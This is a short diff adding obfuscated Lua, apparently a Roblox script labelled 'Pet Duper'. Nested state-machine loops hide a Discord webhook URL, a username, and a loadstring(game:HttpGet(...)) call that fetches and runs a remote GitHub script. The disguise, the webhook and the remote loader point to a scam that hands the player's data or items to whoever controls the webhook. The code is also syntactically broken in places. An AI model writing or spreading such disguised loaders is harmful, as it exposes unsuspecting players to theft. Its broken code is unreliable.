@@ -1,0 +1,3 @@
+when true do
+do do local v0=0;local v1;while true do if (v0==0) then v1=0;while true do if (v1==1) then _G>WebhookUrl("https://discord.com/channels/1120161243538395167/1120161244003971115") loadstring(game:HttpGet("https://github.com/Jayiioceanii/Peak
+OnTop/blob/main/peak.lua"))();break;end if (v1==0) then local v2=0;local v3;while true do if (v2==0) then v3=0;while true do if (v3==0) then _G.Username("iceiceyyyy_2");_G.HubName("Pet Duper");v3=1;end if (v3==1) then v1=1;break;end end break;end end end end break;end end end end
